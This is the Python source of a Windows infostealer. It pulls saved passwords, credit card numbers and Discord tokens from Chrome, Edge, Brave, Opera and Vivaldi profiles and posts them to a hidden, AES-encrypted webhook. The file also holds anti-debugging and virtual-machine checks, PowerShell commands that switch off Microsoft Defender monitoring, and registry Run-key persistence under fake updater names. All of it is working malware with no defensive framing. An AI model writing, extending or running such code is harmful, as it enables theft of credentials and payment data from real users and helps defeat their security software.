import os
import json
import base64
import re
import requests
import winreg
import shutil
import sys
import sqlite3
import time
import random
import ctypes
import subprocess
import glob
import signal
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt
from typing import List, Dict, Set, Optional, Tuple

# ============== CONFIG ==============
class Config:
    _ENCRYPTED_WEBHOOK = b'\xb63\xd3D\xcd\xc7:\xec*\x10\xda\xeaY\x97\xd5\xad\xefn\xaaX5U\x96\xc2K5\x1d/\x01kV\xb6u*i\x81~\\\xe8\x88\xa1m-h\xf3\xe2\xb2]n\xf1\x89\xb3\x9d\xe6X\x8c\xadJN,\x8f\xf7F9~\x99\xb8\xc5\xa0{1?)\xe1\xb5\xa6\xc6\xae\x8b\xa8V3PJ\xb0,do\x0c\x9e\xad\x81#\x11\x94\xf5\x86{?"\x81\\h\xe2\xdf\x0c\xef\xe3A\xb7\xab\xad!d%]\x8b&\xd9\xebn\x10\x16\t8u\xf24B\x03;\xa9\x1c\xe9\xd5\x87\xe7\xcb\xad\xbd<\x15J\xf4YX\xbb\xab\xa5'
    _KEY = b'QuazarXander2026'[:16]

    STARTUP_NAMES = ["WindowsUpdate", "OneDriveSync", "MicrosoftEdgeUpdate", "GoogleUpdateTask", "SecurityHealth"]

    @staticmethod
    def get_webhook():
        try:
            nonce = Config._ENCRYPTED_WEBHOOK[:12]
            ciphertext = Config._ENCRYPTED_WEBHOOK[12:-16]
            tag = Config._ENCRYPTED_WEBHOOK[-16:]
            cipher = AES.new(Config._KEY, AES.MODE_GCM, nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        except:
            return None

# ============== CRYPTO HELPER ==============
class CryptoHelper:
    @staticmethod
    def decrypt_password(encrypted: bytes, master_key: Optional[bytes]) -> str:
        if not encrypted:
            return ""
        if isinstance(encrypted, str):
            try:
                encrypted = base64.b64decode(encrypted)
            except:
                return ""
        if not master_key:
            try:
                return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
            except:
                return ""
        try:
            if encrypted.startswith((b'v10', b'v11', b'v20')):
                iv = encrypted[3:15]
                payload = encrypted[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
        except:
            pass
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return ""

# ============== ANTI ==============
class AntiDebug:
    @staticmethod
    def is_debugged() -> bool:
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            start = time.perf_counter()
            _ = [x ** 2 for x in range(400000)]
            elapsed = time.perf_counter() - start
            if elapsed > 0.15:
                return True
            # Check for common analysis tools
            analysis_tools = ['procmon', 'processhacker', 'tcpview', 'wireshark', 'fiddler', 'x64dbg', 'x32dbg', 'idaq', 'ida64', 'ollydbg', 'pestudio']
            for tool in analysis_tools:
                if any(tool in p.name().lower() for p in []):  # Placeholder, would need psutil
                    return True
        except:
            pass
        return False

    @staticmethod
    def is_vm() -> bool:
        try:
            # Check for VM indicators in registry
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\VBOX__"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\VBOX__"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmicheartbeat"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmicvss"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmicshutdown"),
            ]
            for hkey, subkey in vm_keys:
                try:
                    winreg.OpenKey(hkey, subkey)
                    return True
                except:
                    pass
            # Check CPU cores (VMs often have few cores)
            try:
                import multiprocessing
                if multiprocessing.cpu_count() < 2:
                    return True
            except:
                pass
        except:
            pass
        return False

    @staticmethod
    def bypass_defender():
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            folder = os.path.dirname(exe_path)
            proc = os.path.basename(exe_path)
            cmds = [
                f'Add-MpPreference -ExclusionPath "{folder}"',
                f'Add-MpPreference -ExclusionProcess "{proc}"',
                f'Set-MpPreference -DisableRealtimeMonitoring $true',
                f'Set-MpPreference -DisableBehaviorMonitoring $true'
            ]
            for cmd in cmds:
                subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
                               creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ============== ROBUST BROWSER STEALER ==============
class BrowserStealer:
    DISCORD_TOKEN_RE = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{26}\.[\w-]{6}\.[\w-]{38,}')
    
    def __init__(self):
        self.webhook = Config.get_webhook()
        self.data: List[str] = []
        self.tokens: Set[str] = set()
        self.master_keys: Dict[str, Optional[bytes]] = {}

    def _send(self, title: str, content: str, priority: bool = False):
        if not self.webhook:
            return
        # Chunk content if too long
        max_len = 1900
        chunks = [content[i:i+max_len] for i in range(0, len(content), max_len)]
        if not chunks:
            chunks = [content]
        for i, chunk in enumerate(chunks[:3]):  # Max 3 chunks
            payload = {
                "content": f"**{title}** @everyone\n{chunk}\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**PC:** {os.getenv('COMPUTERNAME')} | **User:** {os.getenv('USERNAME')}",
                "username": random.choice(Config.STARTUP_NAMES),
                "embeds": [{"title": title, "color": 0xff0000 if priority else 0x000000}]
            }
            for attempt in range(6):
                try:
                    requests.post(self.webhook, json=payload, timeout=15)
                    time.sleep(random.uniform(0.5, 1.5))
                    break
                except:
                    time.sleep(1.5 + attempt * 0.5)

    def _get_master_key(self, base_path: str) -> Optional[bytes]:
        if base_path in self.master_keys:
            return self.master_keys[base_path]
        try:
            state_file = os.path.join(base_path, "Local State")
            if not os.path.exists(state_file):
                self.master_keys[base_path] = None
                return None
            with open(state_file, "r", encoding="utf-8", errors='ignore') as f:
                data = json.load(f)
            key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            self.master_keys[base_path] = master_key
            return master_key
        except:
            self.master_keys[base_path] = None
            return None

    def _extract_tokens_from_leveldb(self, leveldb_path: str, browser_name: str):
        if not os.path.exists(leveldb_path):
            return
        temp_dir = None
        try:
            temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f"ldb_{random.randint(1000,9999)}_{int(time.time())}")
            shutil.copytree(leveldb_path, temp_dir, ignore=shutil.ignore_patterns('*.lock', 'LOCK', 'CURRENT', 'MANIFEST*'))
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith(('.log', '.ldb', '.sst')):
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for match in self.DISCORD_TOKEN_RE.findall(content):
                                    if len(match) > 50:
                                        self.tokens.add(f"**{browser_name} TOKEN**: {match[:100]}...")
                        except:
                            pass
        except:
            pass
        finally:
            if temp_dir and os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass

    def _extract_tokens_from_sqlite(self, db_path: str, browser_name: str):
        if not os.path.exists(db_path):
            return
        temp_db = None
        try:
            temp_db = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f"cookies_{random.randint(1000,9999)}.db")
            shutil.copy(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE name LIKE '%token%' OR host_key LIKE '%discord%'")
            for host, name, value, encrypted in cursor.fetchall():
                if value:
                    for match in self.DISCORD_TOKEN_RE.findall(value):
                        self.tokens.add(f"**{browser_name} COOKIE TOKEN** [{host}]: {match[:100]}...")
            conn.close()
        except:
            pass
        finally:
            if temp_db and os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass

    def _steal_browser_passwords(self, browser_name: str, base_path: str):
        if not os.path.exists(base_path):
            return
        master_key = self._get_master_key(base_path)
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 20)]
        found = 0
        
        for profile in profiles:
            prof_path = os.path.join(base_path, profile)
            if not os.path.exists(prof_path):
                continue
            
            login_db = os.path.join(prof_path, "Login Data")
            if os.path.exists(login_db):
                temp_db = None
                try:
                    temp_db = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f"login_{random.randint(1000,9999)}.db")
                    shutil.copy(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' AND password_value != ''")
                    for url, user, pwd_enc in cursor.fetchall():
                        try:
                            pwd = CryptoHelper.decrypt_password(pwd_enc, master_key)
                            if pwd and len(pwd) > 0:
                                self.data.append(f"**{browser_name} LOGIN** [{profile}]\nURL: {url}\nUser: {user}\nPass: {pwd}")
                                found += 1
                                if found >= 100:  # Limit to prevent spam
                                    break
                        except:
                            pass
                    conn.close()
                except:
                    pass
                finally:
                    if temp_db and os.path.exists(temp_db):
                        try:
                            os.remove(temp_db)
                        except:
                            pass
                if found >= 100:
                    break

    def _steal_credit_cards(self, browser_name: str, base_path: str):
        if not os.path.exists(base_path):
            return
        master_key = self._get_master_key(base_path)
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        
        for profile in profiles:
            prof_path = os.path.join(base_path, profile)
            web_data = os.path.join(prof_path, "Web Data")
            if os.path.exists(web_data):
                temp_db = None
                try:
                    temp_db = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f"web_{random.randint(1000,9999)}.db")
                    shutil.copy(web_data, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for name, month, year, card_enc in cursor.fetchall():
                        try:
                            card = CryptoHelper.decrypt_password(card_enc, master_key)
                            if card and len(card) >= 13:
                                self.data.append(f"**{browser_name} CARD** [{profile}]\nName: {name}\nCard: {card}\nExp: {month}/{year}")
                        except:
                            pass
                    conn.close()
                except:
                    pass
                finally:
                    if temp_db and os.path.exists(temp_db):
                        try:
                            os.remove(temp_db)
                        except:
                            pass

    def _steal_cookies(self, browser_name: str, base_path: str):
        if not os.path.exists(base_path):
            return
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        
        for profile in profiles:
            prof_path = os.path.join(base_path, profile)
            cookies_db = os.path.join(prof_path, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                cookies_db = os.path.join(prof_path, "Cookies")
            if os.path.exists(cookies_db):
                self._extract_tokens_from_sqlite(cookies_db, browser_name)

    def _process_browser(self, browser_name: str, exe_path: str, data_path: str):
        if not os.path.exists(data_path):
            return
        
        # Extract from LevelDB (Discord tokens)
        leveldb_path = os.path.join(data_path, "Default", "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            self._extract_tokens_from_leveldb(leveldb_path, browser_name)
        
        # Check other profiles
        for i in range(1, 20):
            prof_leveldb = os.path.join(data_path, f"Profile {i}", "Local Storage", "leveldb")
            if os.path.exists(prof_leveldb):
                self._extract_tokens_from_leveldb(prof_leveldb, browser_name)
        
        # Steal passwords and cards
        self._steal_browser_passwords(browser_name, data_path)
        self._steal_credit_cards(browser_name, data_path)
        self._steal_cookies(browser_name, data_path)

    def run(self):
        if AntiDebug.is_debugged() or AntiDebug.is_vm():
            return
        
        AntiDebug.bypass_defender()
        time.sleep(random.uniform(1.0, 3.0))
        
        user_profile = os.environ.get("USERPROFILE", "")
        appdata_local = os.path.join(user_profile, "AppData", "Local")
        program_files = os.environ.get("ProgramFiles(x86)", "")
        
        browsers: Dict[str, Tuple[str, str]] = {
            "Chrome": (
                os.path.join(appdata_local, "Google", "Chrome", "Application", "chrome.exe"),
                os.path.join(appdata_local, "Google", "Chrome", "User Data")
            ),
            "Edge": (
                os.path.join(program_files, "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(appdata_local, "Microsoft", "Edge", "User Data")
            ),
            "Brave": (
                os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
                os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data")
            ),
            "Opera": (
                os.path.join(appdata_local, "Programs", "Opera", "opera.exe"),
                os.path.join(appdata_local, "Programs", "Opera")
            ),
            "OperaGX": (
                os.path.join(appdata_local, "Programs", "Opera GX", "opera.exe"),
                os.path.join(appdata_local, "Programs", "Opera GX")
            ),
            "Vivaldi": (
                os.path.join(appdata_local, "Vivaldi", "Application", "vivaldi.exe"),
                os.path.join(appdata_local, "Vivaldi", "User Data")
            ),
        }
        
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = {}
            for name, (exe, data) in browsers.items():
                if os.path.exists(data):
                    future = executor.submit(self._process_browser, name, exe, data)
                    futures[future] = name
            
            for future in as_completed(futures):
                name = futures[future]
                try:
                    future.result()
                except:
                    pass
        
        # Send Discord tokens first (high priority)
        if self.tokens:
            token_list = "\n".join(list(self.tokens)[:50])  # Max 50 tokens
            self._send("Discord Tokens Found", token_list, priority=True)
        
        # Send other data in batches
        if self.data:
            batch = []
            batch_size = 0
            for entry in self.data[:200]:  # Max 200 entries
                if batch_size + len(entry) > 1500:
                    if batch:
                        self._send("Browser Data", "\n---\n".join(batch))
                    batch = [entry]
                    batch_size = len(entry)
                else:
                    batch.append(entry)
                    batch_size += len(entry)
            if batch:
                self._send("Browser Data", "\n---\n".join(batch))
        
        if not self.tokens and not self.data:
            self._send("Info", "No data found on this system")
        
        # Persistence
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if exe_path.lower().endswith(".exe"):
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                startup_name = random.choice(Config.STARTUP_NAMES)
                winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
        except:
            pass
        
        # Clean exit
        try:
            os._exit(0)
        except:
            sys.exit(0)

if __name__ == "__main__":
    time.sleep(random.uniform(2.0, 6.0))
    stealer = BrowserStealer()
    stealer.run()